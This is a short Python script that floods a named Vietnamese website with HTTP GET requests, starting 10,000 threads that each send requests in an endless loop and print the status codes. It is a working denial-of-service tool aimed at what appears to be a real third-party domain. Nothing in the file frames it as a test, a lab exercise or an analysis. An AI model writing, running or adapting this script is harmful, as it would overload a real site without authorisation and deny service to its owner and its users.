import requests
import threading
import time

# Target URL
target_url = "https://phongsachnht.com.vn/"

# Number of threads
num_threads = 10000

# Function to send HTTP requests
def send_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Sent request to {target_url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# Create and start threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()